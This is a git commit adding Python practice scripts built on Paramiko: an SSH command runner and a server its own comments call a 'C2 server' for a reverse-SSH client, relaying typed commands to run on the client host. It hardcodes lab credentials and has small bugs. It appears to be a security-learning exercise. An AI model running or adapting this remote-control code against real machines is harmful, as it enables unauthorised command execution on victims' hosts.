8a6f452d9a4e98b521ab911dcdba3fd967bea38d
LogistyxCat <34379017+LogistyxCat@users.noreply.github.com>
2018-07-08 18:16:54 -0700

    bh_ssh series of scripts. Basic SSH concepts, then a client and server.

--- bh_sshcmd.py
+++ bh_sshcmd.py
@@ -1,6 +1,21 @@
-#!/usr/bin/python
-
-# Riley Scott
-# 2018-07-08
-# Ver 0.1
+# Ver 0.2
 # Uses Paramiko to model SSH in Python
+
+# import threading
+import paramiko
+# import subprocess
+
+
+def ssh_command(ip, user, passwd, command):
+    client = paramiko.SSHClient()
+    # client.load_host_keys('/home/justin/.ssh/known_hosts')
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.exec_command(command)
+        print(ssh_session.recv(1024))
+    return
+
+
+ssh_command('192.168.133.131', 'justin', 'lovesthepython', 'id')
---
+++ bh_sshserver.py
@@ -0,0 +1,75 @@
+# Ver 0.3
+# C2 server for the reverse-SSH client script
+# Commands entered here are executed on the host with the client script
+
+import socket
+import paramiko
+import threading
+import sys
+
+host_key = paramiko.RSAKey(filename='test_rsa.key')
+
+
+# Server class for SSH connections
+class Server (paramiko.ServerInterface):
+    def _init_(self):
+        self.event = threading.Event()
+
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def check_auth_password(self, username, password):
+        if (username == 'justin') and (password == 'lovesthepython'):
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
+
+server = sys.argv[1]
+ssh_port = int(sys.argv[2])
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((server, ssh_port))
+    sock.listen(100)
+    print('[+] Listening for connections on %s' % server)
+    client, addr = sock.accept()
+except Exception as e:
+    print('[-] Listen failed: %s' % str(e))
+    sys.exit(1)
+print('[+] Got a connection from %s:%s' % client, addr)
+
+try:
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(host_key)
+    server = Server()
+    try:
+        bhSession.start_server(server=server)
+    except paramiko.SSHException:
+        print('[-] SSH negotiation failed.')
+    chan = bhSession.accept(20)
+    print('[+] Client successfully authenticated!')
+    print(chan.recv(1024))
+    chan.send('Welcome to the bh_ssh')
+    while True:
+        try:
+            command = input("Enter command: ").strip('\n')
+            if command != 'exit':
+                chan.send(command)
+                print(chan.recv(1024) + '\n')
+            else:
+                chan.send('exit')
+                print('exiting')
+                bhSession.close()
+                raise Exception('exit')
+        except KeyboardInterrupt:
+            bhSession.close()
+except Exception as e:
+    print('[-] Caught exception: %s' % str(e))
+    try:
+        bhSession.close()
+    except:
+        pass
+    sys.exit(1)
